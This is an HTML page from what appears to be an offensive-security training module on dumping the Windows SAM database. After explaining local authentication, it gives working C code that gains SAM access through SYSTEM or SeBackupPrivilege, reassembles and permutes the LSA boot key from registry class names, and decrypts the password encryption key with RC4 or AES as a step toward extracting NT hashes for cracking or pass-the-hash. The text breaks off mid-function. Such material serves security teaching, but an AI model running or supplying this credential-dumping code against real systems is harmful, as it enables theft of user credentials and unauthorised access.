          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Dumping the SAM Database</h2>
<h3>Introduction to Authentication</h3>
<p>Before being allowed to interact with a Windows system, a user must 
prove their identity by authenticating. Authentication is the process of
 verifying the identity of a person or object. To accommodate different 
authentication scenarios, Windows supports multiple types of 
authentication, which vary in length and complexity.</p>
<h3>Interactive Authentication</h3>
<p>Interactive authentication is used to grant access to both local and 
domain resources. It begins when a user supplies a set of credentials 
(e.g. password, smart card, certificate) and, if successful, ends with 
the creation of an <em>access token</em>.</p>
<p>An access token serves as the security context of a process or thread
 and contains information such as the identity and privileges of the 
user. When interacting with a <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects">securable object</a>,
 the system uses the token during to determine whether the user has 
sufficient rights to perform the requested action. An object is 
considered securable if it has a <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors">security descriptor</a>,
 which is a data structure containing security information about the 
object. This information includes a discretionary access control list 
(DACL), which defines who has access to the object and their access 
level.</p>
<p>For the purpose of authentication, Windows uses a <em>domain</em>. A 
domain associates a set of users and groups with a policy, which governs
 the actions they can perform and the resources they can access. It also
 provides management infrastructure for these entities, including logon 
infrastructure. Domain architecture is complex enough to warrant an 
entire course, so we will start by familiarizing ourselves with the 
authentication process of the simplest form of a domain: the local 
domain.</p>
<h3>The Local Domain</h3>
<p>Although domains are often associated with enterprise networks, every
 computer, whether stand-alone or part of a network, belongs to a domain
 known as the <em>local domain</em>. This domain usually goes unnoticed because it shares the same name as the computer itself.</p>
<img src="75_files/LocalDomain.png" style="margin:auto" width="600px">
<p>In this scenario, the <em>local security policy</em> is applied to local users and groups. Maintained by the Local Security Authority (LSA), it includes information such as:</p>
<ul>
<li>
<p>Account rights - The privileges assigned to a user's token when they log in.</p>
</li>
<li>
<p>Logon rights - What types of authentication a user or group is 
allowed to perform. For example, they can be used to deny a user from 
authenticating over the network.</p>
</li>
<li>
<p>Security auditing policy - Governs which events will be recorded in 
the event log and the conditions under which they will be recorded, such
 as success or failure.</p>
</li>
</ul>
<p>The LSA is also responsible for local domain management. To this end,
 it maintains two databases stored as registry keys: the SAM database 
and the LSA policy database:</p>
<ul>
<li>
<p>The Security Account Manager (SAM) database contains login 
information about local groups and users, such as usernames, password 
hashes, security identifiers (SIDs), and group memberships. When 
authenticating to the local domain, the LSA calculates a hash of your 
password and matches it with the one stored in the SAM.</p>
</li>
<li>
<p>On the other hand, the LSA policy database contains the local 
security policy described above. We will deep dive into the LSA policy 
in a later module.</p>
</li>
</ul>
<h3>Network Authentication</h3>
<p>In certain scenarios, an application or service may need to access 
network resources, such as a file share. This type of authentication 
uses previously established credentials and is typically transparent 
unless alternative credentials must be specified. Windows supports 
multiple network authentication protocols, which we will explore later.</p>
<h3>Dumping the SAM Database</h3>
<p>The SAM database is located in the <code>Registry\Machine\SAM</code> and can only be accessed by <code>NT AUTHORITY\SYSTEM</code>. Alternatively, we can bypass access checks via the <code>SeBackupPrivilege</code> privilege. The <code>CanAccessSam</code> function determines if we can access the SAM by first querying the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Security Identifier (SID)</a> of the user associated with our process. Then, it constructs the SID of the <code>NT AUTHORITY\SYSTEM</code> account and compares the two. If they are equal, we can simply proceed. Otherwise, we attempt to acquire the <code>SeBackupPrivilege</code> privilege. If we fail, we cannot access the SAM.</p>
<p>First, we will create a helper function that will be used by the <code>CanAccessSam</code> function that checks if the provided SID is that of <code>NT AUTHORITY\SYSTEM</code>. The <code>IsSidLocalSystem</code> function has one parameter <code>Sid</code> which is the user's ID. It then uses <code>RtlAllocateAndInitializeSid</code> to construct <code>NT AUTHORITY\SYSTEM</code>'s SID, being <code>S-1-5-18</code>. Finally, a comparison is made using <code>RtlEqualSid</code> which, if true, means that the given SID matches <code>NT AUTHORITY\SYSTEM</code>.</p>
<p>The <code>IsSidLocalSystem</code> function has one parameter, <code>Sid</code>, which is a pointer to the SID that is to be compared to <code>S-1-5-18</code>.</p>
<pre><code class="language-C">BOOLEAN IsSidLocalSystem(_In_ PSID Sid)
{
    //
    // We need the NT Identifier Authority, represented by the "5" in 
"S-1-5-18", and the Local System RID, which matches "18"
    //

	PSID                     LocalSystemSid;
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority = SECURITY_NT_AUTHORITY;
	NTSTATUS                 Status = 
RtlAllocateAndInitializeSid(&amp;IdentifierAuthority, 1, 
SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &amp;LocalSystemSid);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not initialize the NT AUTHORITY\\SYSTEM SID: 0x%08lX",
 Status);
		return FALSE;
	}

	BOOLEAN Result = RtlEqualSid(Sid, LocalSystemSid);
	RtlFreeSid(LocalSystemSid);
	return Result;
}
</code></pre>
<p>The <code>CanAcccessSam</code> function has one parameter, <code>NtOpenKeyExPointer</code>, which is a function pointer to <code>NtOpenKeyEx</code>. This informs us under what circumstances we are accessing the SAM. If the parameter is not set, we are <code>NT AUTHORITY\SYSTEM</code> and can simply use <code>NtOpenKey</code> to access SAM keys. In the other case, we must use <code>NtOpenKeyEx</code> with the <code>REG_OPTION_BACKUP_RESTORE</code> flag. Since <code>NtOpenKeyEx</code> is only available on Windows 7 and above, we will dynamically resolve it and fail if it is not present.</p>
<pre><code class="language-C">NTSTATUS CanAccessSam(_Out_ 
decltype(NtOpenKeyEx)** NtOpenKeyExPointer)
{
	//
	// Open a handle to the process token. 
	// You can use the NtCurrentProcessToken pseudo-handle on Windows 8 and
 above.
	//

	HANDLE   TokenHandle;
	NTSTATUS Status = NtOpenProcessToken(NtCurrentProcess, TOKEN_QUERY, 
&amp;TokenHandle);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not open process token: 0x%08lX", Status);
		return Status;
	}

	//
	// Query the token user's SID
	//

	ULONG       ReturnLength;
	UCHAR       Buffer[TOKEN_USER_MAX_SIZE] = { 0 };
	PTOKEN_USER UserSid = (PTOKEN_USER)(Buffer);

	Status = NtQueryInformationToken(TokenHandle, TokenUser, UserSid, 
TOKEN_USER_MAX_SIZE, &amp;ReturnLength);
	NtClose(TokenHandle);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not retrieve the user SID of the process token: 
0x%08lX", Status);
		return Status;
	}

	//
	// If we are not running in the context of local system account, 
	// our only other hope of accessing the SAM is leveraging NtOpenKeyEx 
alongside SeBackupPrivilege
	//

	if (IsSidLocalSystem(UserSid) == TRUE)
	{
		return Status;
	}

	ULONG Privilege = SE_BACKUP_PRIVILEGE;
	PVOID State;

	Status = RtlAcquirePrivilege(&amp;Privilege, 1, 0, &amp;State);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not acquire the SeBackupPrivilege privilege: 0x%08lX",
 Status);
		return Status;
	}

	//
	// NtOpenKeyEx only exists on Windows 7 and above.
	// On earlier versions of Windows, you can use NtSaveKey in conjuction 
with the SeBackupPrivilege privilege to dump the necessary keys to a 
file
	//

	PVOID          DllHandle;
	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"ntdll.dll");

	Status = LdrGetDllHandle(0, 0, &amp;DllName, &amp;DllHandle);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not get a handle to NTDLL: 0x%08lX", Status);
		return Status;
	}

	ANSI_STRING ProcedureName = RTL_CONSTANT_ANSI_STRING("NtOpenKeyEx");
	Status = LdrGetProcedureAddress(DllHandle, &amp;ProcedureName, 0, 
(PVOID*)(NtOpenKeyExPointer));

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not find NtOpenKeyEx: 0x%08lX", Status);
	}

	return Status;
}
</code></pre>
<br>
<h3>Dumping local domain information</h3>
<p>Windows stores the MD4 hash of each local user's password. This hash is commonly known as the <em>NT hash</em>.
 For compatibility reasons, Windows used to store an additional LAN 
Manager (LM) hash. This feature has been disabled by default since 
Windows Vista.</p>
<p>Unfortunately, dumping NT hashes is not trivial as they are subject 
to multiple layers of obfuscation: First, the NT hash is encrypted with 
the DES algorithm where the key is the relative identifier (RID) of the 
corresponding user. The RID is a unique number assigned to each <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-principals">security principle</a>
 (such as a user or group) within a domain; in this scenario, the local 
domain. Next, the DES-encrypted hash is encrypted using the password 
encryption key (PEK). The PEK, in turn, is encrypted using the <em>LSA system key</em>.</p>
<img src="75_files/HashObfuscation.png" style="margin:auto" width="800px">
<p>Access to these hashes is useful because the weak hashing algorithm makes them easily crackable. Nonetheless, you can use <em>pass-the-hash</em> to perform network authentication without knowing the plaintext password. This technique will be explored in a later module.</p>
<p>As mentioned earlier, the first step in retrieving NT hashes is 
acquiring the LSA system key. This 16-byte key is divided among the <code>ClassName</code>
 attribute of four registry keys, with each key containing four bytes of
 the LSA system key. All of these keys are subkeys of the LSA 
configuration key, which is in <code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\</code>. The specific subkeys are:</p>
<ul>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\JD</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\Skew1</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\GBG</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\Data</code></p>
</li>
</ul>
<p>In addition, a series of permutations must be performed on the key's 
bytes to achieve its true value. Note that the LSA system key differs 
from system to system.
This process is encapsulated in the <code>GetLsaSystemKey</code> function, which opens a handle to each one of the keys described above, queries their class name before using <code>wcstoul</code> to convert it into a 4 byte integer. If it succeeds in constructing the 16-byte key, it will set each byte of <code>SystemKey</code> buffer according to the permutations, giving us the LSA system key.</p>
<p>The <code>GetLsaSystemKey</code> function has one parameter, <code>SystemKey</code>, which is a pointer to a 16-byte buffer that will receive the LSA system key.</p>
<pre><code class="language-C">NTSTATUS GetLsaSystemKey(_Out_ PUCHAR 
SystemKey)
{
	//
	// Open a handle to the LSA configuration key
	//

	HANDLE			  LsaKey;
	UNICODE_STRING    KeyName = 
RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\
\Control\\Lsa\\");
	OBJECT_ATTRIBUTES KeyAttributes;

	InitializeObjectAttributes(&amp;KeyAttributes, &amp;KeyName, 
OBJ_CASE_INSENSITIVE, 0, 0)

	NTSTATUS Status = NtOpenKey(&amp;LsaKey, KEY_ENUMERATE_SUB_KEYS, 
&amp;KeyAttributes);

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not open a handle to the LSA configuration key: 
0x%08lX", Status);
		return Status;
	}

	//
	// The 16-byte key is split between four parts, in the ClassName value 
of the JD, Skew1, GBG and Data registry keys
	//

	UNICODE_STRING KeyNames[]{ RTL_CONSTANT_STRING(L"JD"), 
RTL_CONSTANT_STRING(L"Skew1"), RTL_CONSTANT_STRING(L"GBG"), 
RTL_CONSTANT_STRING(L"Data") };
	HANDLE		   KeyHandle;
	UCHAR          KeyParts[16];
	ULONG		   ResultLength;

	KeyAttributes.RootDirectory = LsaKey;

	for (UCHAR Index = 0; Index &lt; 4; Index++)
	{
		//
		// Open a handle to the subkey
		//

		KeyAttributes.ObjectName = &amp;KeyNames[Index];
		Status = NtOpenKey(&amp;KeyHandle, KEY_QUERY_VALUE, 
&amp;KeyAttributes);

		if (!NT_SUCCESS(Status))
		{
			wprintf(L"Could not open a handle to the %wZ key: 0x08lX", 
KeyAttributes.ObjectName, Status);
			break;
		}

		//
		// Query its class name
		//

		UCHAR                 Buffer[100] = { 0 };
		PKEY_NODE_INFORMATION NodeInformation = 
(PKEY_NODE_INFORMATION)(Buffer);

		Status = NtQueryKey(KeyHandle, KeyNodeInformation, NodeInformation, 
100, &amp;ResultLength);
		NtClose(KeyHandle);

		if (!NT_SUCCESS(Status))
		{
			wprintf(L"Could not open a handle to the %wZ key: 0x08lX", 
KeyAttributes.ObjectName, Status);
			break;
		}

		//
		// Since the class name is a string, we need to use wcstoul to convert
 it to an unsigned long. 
		// We then use bswap32 to reverse the byte order, accounting for 
endianess.
		// 

		*(PULONG)(KeyParts + Index * 4) = 
_byteswap_ulong(wcstoul((PWCHAR)(Buffer + 
NodeInformation-&gt;ClassOffset), 0, 16));
	}

	//
	// Permutate the key parts in order to generate the final key
	//

	if (NT_SUCCESS(Status))
	{
		SystemKey[0] = KeyParts[8];
		SystemKey[1] = KeyParts[5];
		SystemKey[2] = KeyParts[4];
		SystemKey[3] = KeyParts[2];
		SystemKey[4] = KeyParts[11];
		SystemKey[5] = KeyParts[9];
		SystemKey[6] = KeyParts[13];
		SystemKey[7] = KeyParts[3];
		SystemKey[8] = KeyParts[0];
		SystemKey[9] = KeyParts[6];
		SystemKey[10] = KeyParts[1];
		SystemKey[11] = KeyParts[12];
		SystemKey[12] = KeyParts[14];
		SystemKey[13] = KeyParts[10];
		SystemKey[14] = KeyParts[15];
		SystemKey[15] = KeyParts[7];
	}

	NtClose(LsaKey);
	return Status;
}
</code></pre>
<p>Equipped with the LSA system key, we can decrypt the password encryption key. The PEK is stored in the <code>F</code> value of the <code>\Registry\Machine\SAM\SAM\Domains\Account</code> registry key which contains the domains' <em>Fixed</em>
 attributes. These attributes are "fixed" because they are present on 
each domain, regardless of configuration. Some attributes have different
 meanings if the computer is a domain controller. For now, however, we 
will focus on the attributes relevant to the local domain.</p>
<p>The <code>GetPasswordEncryptionKey</code> function opens a handle on the <code>Account</code> key, queries the <code>F</code> value and uses <code>PrintDomainFixedData</code> the print domain fixed attributes to the console. Finally, it will use the LSA system key to decrypt the PEK using the <code>DecryptPasswordEncryptionKey</code> function. These two functions will be explained later in the module.</p>
<p>The <code>GetPasswordEncryptionKey</code> function has three parameters:</p>
<ul>
<li>
<p><code>LsaSystemKey</code> - The LSA system key, obtained by calling <code>GetLsaSystemKey</code>.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to a 16-byte buffer that will receive the PEK.</p>
</li>
<li>
<p><code>OpenKeyEx</code> - The function pointer to <code>NtOpenKeyEx</code>. If the pointer is null, then we know that we are <code>NT AUTHORITY\SYSTEM </code>and can use <code>NtOpenKey</code>. Otherwise, we must use the received function pointer.</p>
</li>
</ul>
<pre><code class="language-C">UNICODE_STRING FixedAttributesValueName = 
RTL_CONSTANT_STRING(L"F");

NTSTATUS GetPasswordEncryptionKey(_In_ PUCHAR LsaSystemKey, _Out_ PUCHAR
 PasswordEncryptionKey, _In_ decltype(NtOpenKeyEx)* OpenKeyEx)
{
	//
	// Open a handle to the "Account" key, which holds information about 
the local domain
	//

	HANDLE			  AccountKey;
	UNICODE_STRING    KeyName = 
RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account");
	OBJECT_ATTRIBUTES KeyAttributes;

	InitializeObjectAttributes(&amp;KeyAttributes, &amp;KeyName, 
OBJ_CASE_INSENSITIVE, 0, 0)

	NTSTATUS Status;

	if (OpenKeyEx == 0)
	{
		Status = NtOpenKey(&amp;AccountKey, KEY_READ, &amp;KeyAttributes);
	}
	else
	{
		Status = OpenKeyEx(&amp;AccountKey, KEY_READ, &amp;KeyAttributes, 
REG_OPTION_BACKUP_RESTORE);
	}

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not open a handle to the SAM account key: 0x%08lX", 
Status);
		return Status;
	}

	do
	{
		//
		// Query the value of the "F" entry. It contains the *F*ixed 
attributes of the local domain; they are "fixed" because they are always
 present, regardless of the configuration
		//

		ULONG ResultLength;
		Status = NtQueryValueKey(AccountKey, &amp;FixedAttributesValueName, 
KeyValueFullInformation, 0, 0, &amp;ResultLength);

		if (Status != STATUS_BUFFER_TOO_SMALL)
		{
			wprintf(L"Could not query the value of the F entry: 0x%08lX", 
Status);
			break;
		}

		PKEY_VALUE_FULL_INFORMATION KeyValue = 
(PKEY_VALUE_FULL_INFORMATION)(HeapAlloc(GetProcessHeap(), 
HEAP_ZERO_MEMORY, ResultLength));

		if (KeyValue == 0)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		Status = NtQueryValueKey(AccountKey, &amp;FixedAttributesValueName, 
KeyValueFullInformation, KeyValue, ResultLength, &amp;ResultLength);

		if (NT_SUCCESS(Status))
		{
			PSAM_DOMAIN_FIXED_DATA DomainFixedData{ 
(PSAM_DOMAIN_FIXED_DATA)((PUCHAR)(KeyValue) + KeyValue-&gt;DataOffset) 
};

			//
			// Print the domain fixed data
			//

			PrintDomainFixedData(DomainFixedData);

			//
			// Use the LSA system key to decrypt the PEK
			//

			Status = DecryptPasswordEncryptionKey(LsaSystemKey, DomainFixedData, 
PasswordEncryptionKey);
		}

		HeapFree(GetProcessHeap(), 0, KeyValue);

	} while (FALSE);

	NtClose(AccountKey);
	return Status;
}
</code></pre>
<p>To further our understanding of the data that the SAM stores for each domain, we print it out using the <code>PrintDomainFixedData</code>
 function. The aforementioned function receives a pointer to the 
structure describing the domain's fixed attributes and prints them to 
the console in a readable format. The function has one parameter, <code>DomainFixedData</code>, which is a pointer to a <code>SAM_DOMAIN_FIXED_DATA</code>, containing the fixed attributes of a domain</p>
<pre><code class="language-C">VOID PrintDomainFixedData(_In_ 
PSAM_DOMAIN_FIXED_DATA DomainFixedData)
{
	wprintf(L"============================================\n"
		L"||            Domain fixed data           ||\n"
		L"============================================\n\n");

	wprintf(L"Version: %hu\n", DomainFixedData-&gt;Version);

	//
	// The number of modifications made to the domain, such as a new user 
being added
	//

	wprintf(L"DomainModifiedCount: %lu\n", 
DomainFixedData-&gt;DomainModifiedCount.QuadPart);

	//
	// The time of creation of the domain
	//

	SYSTEMTIME SystemTime;
	
FileTimeToSystemTime((PFILETIME)(&amp;DomainFixedData-&gt;CreationTime),
 &amp;SystemTime);
	wprintf(L"CreationTime: %lu/%lu/%lu %lu:%lu:%lu\n", SystemTime.wDay, 
SystemTime.wMonth, SystemTime.wYear, SystemTime.wHour, 
SystemTime.wMinute, SystemTime.wSecond);

	//
	// The minimum and maximum time before a password change is required
	//

	wprintf(L"Minimum password age: %lu seconds\n", 
DomainFixedData-&gt;MinPasswordAge.QuadPart &gt; 0 ? 
DomainFixedData-&gt;MinPasswordAge.QuadPart / -10000000 : 0);
	wprintf(L"Maximum password age: %lu seconds\n", 
DomainFixedData-&gt;MaxPasswordAge.QuadPart &gt; 0 ? 
DomainFixedData-&gt;MaxPasswordAge.QuadPart / -10000000 : 0);

	//
	// Tracks the next RID available to be assigned to a security principal
 (such as a user or a group) within a domain.
	// This value is incremented each time a new security principal is 
created in the domain. It ensures that each principal receives a unique 
RID
	//

	wprintf(L"Next RID: %lu\n", DomainFixedData-&gt;NextRid);

	//
	// The amount of time an interactive logon session is allowed to 
persist
	//

	wprintf(L"Force logoff: %lu seconds\n", 
DomainFixedData-&gt;ForceLogoff.QuadPart &gt; 0 ? 
DomainFixedData-&gt;ForceLogoff.QuadPart / -10000000 : 0);

	//
	// LockoutThreshold represents the number of failed password attempts 
in an interval of LockoutObservationWindows seconds before 
	// an account is locked out for LockoutDuration seconds
	//

	wprintf(L"Lockout threshold: %lu attempts\n", 
DomainFixedData-&gt;LockoutThreshold);
	wprintf(L"Lockout observation windows: %lu seconds\n", 
DomainFixedData-&gt;LockoutObservationWindow.QuadPart &gt; 0 ? 
DomainFixedData-&gt;LockoutObservationWindow.QuadPart / -10000000 : 0);
	wprintf(L"Lockout duration: %lu seconds\n", 
DomainFixedData-&gt;LockoutDuration.QuadPart &gt; 0 ? 
DomainFixedData-&gt;LockoutDuration.QuadPart / -10000000 : 0);

	//
	// The number of updates made to the domain up to the last time a 
domain controller was promoted within the domain
	//

	wprintf(L"ModifiedCountAtLastPromotion: %lu\n", 
DomainFixedData-&gt;ModifiedCountAtLastPromotion);

	//
	// Bit field describing the password policy
	//

	wprintf(L"Password properties:\n");
	wprintf(L" - The password %s complexity requirements\n", 
DomainFixedData-&gt;PasswordProperties &amp; DOMAIN_PASSWORD_COMPLEX ? 
L"has" : L"does not have");
	wprintf(L" - The password %s be changed without logging on\n", 
DomainFixedData-&gt;PasswordProperties &amp; 
DOMAIN_PASSWORD_NO_ANON_CHANGE ? L"cannot" : L"can");
	wprintf(L" - The client %s use a protocol that prevents the DC from 
getting the plaintext password\n", 
DomainFixedData-&gt;PasswordProperties &amp; 
DOMAIN_PASSWORD_NO_CLEAR_CHANGE ? L"must" : L"does not have to");
	wprintf(L" - The built-in administrator account %s be locked out from 
network logons\n", DomainFixedData-&gt;PasswordProperties &amp; 
DOMAIN_LOCKOUT_ADMINS ? L"can" : L"cannot");
	wprintf(L" - Passwords %s stored in plaintext\n", 
DomainFixedData-&gt;PasswordProperties &amp; 
DOMAIN_PASSWORD_STORE_CLEARTEXT ? L"are" : L"are not");
	wprintf(L" - The machine account password %s automatically changed 
every week\n", DomainFixedData-&gt;PasswordProperties &amp; 
DOMAIN_REFUSE_PASSWORD_CHANGE ? L"is not" : L"is");

	wprintf(L"Minimum password length: %lu\n", 
DomainFixedData-&gt;MinPasswordLength);

	//
	// The number of previous passwords saved in the history list. A new 
password cannot match any of the passwords in this list
	//

	wprintf(L"Password history length: %lu\n", 
DomainFixedData-&gt;PasswordHistoryLength);

	//
	// Indicates whether the server is enabled in response to MS-SAMR 
calls. Ignored in modern implementations
	//

	wprintf(L"DomainServerState: %s\n", 
DomainFixedData-&gt;DomainServerState == DomainServerEnabled ? 
L"Enabled" : L"Disabled");

	//
	// Specifies the role of a domain controller in the domain. Irrelevant 
in modern Active Directory as all domain controllers are functionally 
equivalent.
	//

	wprintf(L"DomainServerRole: %s\n", DomainFixedData-&gt;DomainServerRole
 == DomainServerRolePrimary ? L"Primary" : L"Backup");

	//
	// Only relevant for the discontinued Microsoft LAN Manager OS
	//

	wprintf(L"UasCompatibilityRequired: %lu\n", 
DomainFixedData-&gt;UasCompatibilityRequired);
}
</code></pre>
<p>The next step is to decrypt the PEK. On older versions of Windows, 
the PEK is encrypted using RC4 with the key being an MD5 hash derived 
from a concatenation of an initialization vector, along with two fixed 
strings and the LSA system key. In Windows 10 version 1607, the cipher 
is changed to AES-128-CBC with the LSA system key taking the place of 
the AES key. Keeping this in mind, let us first create a helper function
 that decrypts data using AES-128. The <code>Aes128Decrypt</code> function uses the WinCrypt API to AES-128 decrypt the specified ciphertext in-place. It has the following parameters:</p>
<ul>
<li>
<p><code>Key</code> - A pointer to a 16-byte key.</p>
</li>
<li>
<p><code>Iv</code> - A pointer to a 16-byte IV.</p>
</li>
<li>
<p><code>Ciphertext</code> - A pointer to the ciphertext which is to be 
decrypted. Since decryption is performed in-place, the size of this 
buffer must be aligned to 16 bytes.</p>
</li>
<li>
<p><code>CiphertextLength</code> - The size of the <code>Ciphertext</code> buffer, in bytes.</p>
</li>
</ul>
<pre><code class="language-C">BOOLEAN Aes128Decrypt(_In_ PUCHAR Key, _In_ PUCHAR Iv, _Inout_ PUCHAR Ciphertext, _Inout_ ULONG CiphertextLength)
{
	HCRYPTPROV Provider;
	BOOL       Result = CryptAcquireContextA(&amp;Provider, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	if (Result == FALSE)
	{
		wprintf(L"Cannot acquire handle to the AES crypto provider: %lu", GetLastError());
		return FALSE;
	}

	HCRYPTKEY KeyHandle = 0;

	do
	{
		//
		// The key blob header is followed in memory by the size of the key, in bytes, and the key itself
		//

		UCHAR       Buffer[AES_KEY_BLOB_SIZE];
		BLOBHEADER* KeyBlob = (BLOBHEADER*)(Buffer);

		KeyBlob-&gt;bType    = PLAINTEXTKEYBLOB;
		KeyBlob-&gt;bVersion = CUR_BLOB_VERSION;
		KeyBlob-&gt;reserved = 0;
		KeyBlob-&gt;aiKeyAlg = CALG_AES_128;

		*(PULONG)(Buffer + sizeof(BLOBHEADER)) = AES_KEY_SIZE;
		RtlCopyMemory(Buffer + sizeof(BLOBHEADER) + sizeof(ULONG), Key, AES_KEY_SIZE);

		Result = CryptImportKey(Provider, Buffer, AES_KEY_BLOB_SIZE, 0, 0, &amp;KeyHandle);

		if (Result == FALSE)
		{
			wprintf(L"Could not import the AES key: %lu", GetLastError());
			break;
		}

		//
		// Set CBC mode
		//

		ULONG Mode = CRYPT_MODE_CBC;
		Result     = CryptSetKeyParam(KeyHandle, KP_MODE, (PUCHAR)(&amp;Mode), 0);

		if (Result == FALSE)
		{
			wprintf(L"Could not set the AES mode to CBC: %lu", GetLastError());
			break;
		}

		//
		// Set the IV
		//

		Result = CryptSetKeyParam(KeyHandle, KP_IV, Iv, 0);

		if (Result == FALSE)
		{
			wprintf(L"Could not set the IV: %lu", GetLastError());
			break;
		}

		//
		// Decrypt the ciphertext
		//

		Result = CryptDecrypt(KeyHandle, 0, TRUE, 0, Ciphertext, &amp;CiphertextLength);

		if (Result == FALSE)
		{
			wprintf(L"Could not decrypt the ciphertext: %lu", GetLastError());
		}

	} while (FALSE);

	if (KeyHandle != 0)
	{
		CryptDestroyKey(KeyHandle);
	}

	CryptReleaseContext(Provider, 0);
	return Result;
}
</code></pre>
<p>The <code>DecryptPasswordEncryptionKey</code> function reads the PEK version from the respective domain attribute, specifically <code>DomainFixedData-&gt;PasswordEncryptionKey</code>.
 Depending on the version, a different decryption routine is performed, 
as explained above. If decryption is successful, the PEK is copied into 
the <code>PasswordEncryptionKey</code> buffer.</p>
<ul>
<li>
<p><code>LsaSystemKey</code> - The LSA system key, obtained by calling <code>GetLsaSystemKey</code>.</p>
</li>
<li>
<p><code>DomainFixedData</code> - A pointer to a <code>SAM_DOMAIN_FIXED_DATA</code> containing the fixed attributes of a domain, including the PEK.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to a 16-byte buffer that will receive the PEK.</p>
</li>
</ul>
<pre><code class="language-C">CHAR String1[] = 
"!@#$%^&amp;*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&amp;%";
CHAR String2[] = "0123456789012345678901234567890123456789";

BOOLEAN DecryptPasswordEncryptionKey(_In_ PUCHAR LsaSystemKey, _In_ 
PSAM_DOMAIN_FIXED_DATA DomainFixedData, _Out_ PUCHAR 
PasswordEncryptionKey)
{
	switch (DomainFixedData-&gt;PasswordEncryptionKey.Version)
	{
		case 1:
		{
			//
			// Create the RC4 key. Fortunately NTDLL exports MD5 function
			//

			MD5_CTX Md5Context;

			MD5Init  (&amp;Md5Context);
			MD5Update(&amp;Md5Context, 
DomainFixedData-&gt;PasswordEncryptionKey.Rc4.Salt, 16);
			MD5Update(&amp;Md5Context, String1, sizeof(String1));
			MD5Update(&amp;Md5Context, LsaSystemKey, SYSTEM_KEY_SIZE);
			MD5Update(&amp;Md5Context, String2, sizeof(String2));
			MD5Final (&amp;Md5Context);

			//
			// Use SystemFunction033 for RC4 decryption
			//

			STRING Data;
			Data.Length = Data.MaximumLength = PEK_SIZE;
			Data.Buffer = DomainFixedData-&gt;PasswordEncryptionKey.Rc4.Key;

			STRING Key;
			Key.Length = Key.MaximumLength = MD5_DIGEST_LENGTH;
			Key.Buffer = Md5Context.Digest;

			NTSTATUS Status = SystemFunction033(&amp;Data, &amp;Key);

			if (NT_SUCCESS(Status))
			{
				RtlCopyMemory(PasswordEncryptionKey, Data.Buffer, Data.Length);
				return TRUE;
			}
			
			wprintf(L"Cannot decrypt the PEK: 0x%08lX", Status);
			return FALSE;
		}

		case 2:
		{
			//
			// Decryption is done in-place so we will copy the decrypted key into
 the PasswordEncryptionKey buffer
			//

			BOOLEAN Result = Aes128Decrypt(LsaSystemKey, 
